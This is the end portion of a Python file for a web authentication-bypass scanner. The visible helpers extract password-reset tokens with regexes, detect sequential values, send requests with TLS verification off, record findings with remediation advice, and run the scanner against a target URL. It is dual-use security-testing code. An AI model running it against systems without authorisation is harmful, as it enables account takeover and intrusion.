            severity="Info",
            remediation="Implement single-use TOTP codes. Add 30-second expiration. Invalidate code after successful use.",
            category="Authentication",
            affected_url=mfa_url,
            evidence=evidence,
        )

    def _extract_reset_token(self, response: requests.Response) -> Optional[str]:
        """Extract reset token from response"""
        import re

        # Common token patterns
        patterns = [
            r"token=([a-zA-Z0-9_-]{20,})",
            r'"token":\s*"([a-zA-Z0-9_-]{20,})"',
            r"reset/([a-zA-Z0-9_-]{20,})",
        ]

        for pattern in patterns:
            matches = re.findall(pattern, response.text)
            if matches:
                return matches[0]

        return None

    def _check_sequential_pattern(self, values: List[str]) -> bool:
        """Check if values follow sequential pattern"""
        try:
            # Try to convert to integers
            int_values = []
            for v in values:
                # Try to extract numeric portion
                import re

                numbers = re.findall(r"\d+", v)
                if numbers:
                    int_values.append(int(numbers[0]))

            if len(int_values) >= 2:
                # Check if sequential
                differences = [
                    int_values[i + 1] - int_values[i]
                    for i in range(len(int_values) - 1)
                ]
                # If all differences are same or within small range, it's sequential
                if (
                    len(set(differences)) <= 2
                    and max(differences) - min(differences) <= 5
                ):
                    return True
        except:
            pass

        return False

    def _build_request_string(
        self, method: str, url: str, data: Dict = None, headers: Dict = None
    ) -> str:
        """Build readable request string for evidence"""
        req = f"{method} {url}\n"

        if headers:
            for k, v in headers.items():
                req += f"{k}: {v}\n"

        req += "\n"

        if data:
            if isinstance(data, dict):
                req += urlencode(data)
            else:
                req += str(data)

        return req

    def _safe_request(
        self, method: str, url: str, **kwargs
    ) -> Optional[requests.Response]:
        """Make safe HTTP request with error handling"""
        try:
            kwargs.setdefault("timeout", self.timeout)
            kwargs.setdefault("allow_redirects", True)
            kwargs.setdefault("verify", False)

            if method == "GET":
                return requests.get(url, **kwargs)
            elif method == "POST":
                return requests.post(url, **kwargs)
            elif method == "PUT":
                return requests.put(url, **kwargs)
            elif method == "DELETE":
                return requests.delete(url, **kwargs)

        except requests.exceptions.RequestException as e:
            print(f"[-] Request error: {str(e)}")
            return None
        except Exception as e:
            print(f"[-] Unexpected error: {str(e)}")
            return None

    def add_vulnerability(
        self,
        title: str,
        description: str,
        severity: str,
        remediation: str,
        category: str,
        affected_url: str,
        evidence: Dict,
    ):
        """Add vulnerability to results"""
        severity_scores = {"Critical": 10, "High": 7, "Medium": 5, "Low": 3, "Info": 1}

        vuln = {
            "title": title,
            "description": description,
            "severity": severity,
            "severity_score": severity_scores.get(severity, 1),
            "remediation": remediation,
            "category": category,
            "affected_url": affected_url,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat(),
        }

        self.vulnerabilities.append(vuln)
        print(f"[!] Vulnerability found: {title} ({severity})")


# Testing
if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python auth_bypass_advanced.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    print(f"[+] Testing advanced authentication bypass on: {target}")
    print("=" * 80)

    scanner = AdvancedAuthBypass(target)
    results = scanner.run_all_tests()

    print("\n" + "=" * 80)
    print(f"[+] Scan complete! Found {results['total_findings']} vulnerabilities")
    print("=" * 80)

    # Print summary
    for vuln in results["vulnerabilities"]:
        print(f"\n[{vuln['severity']}] {vuln['title']}")
        print(f"    URL: {vuln['affected_url']}")
        print(f"    Category: {vuln['category']}")
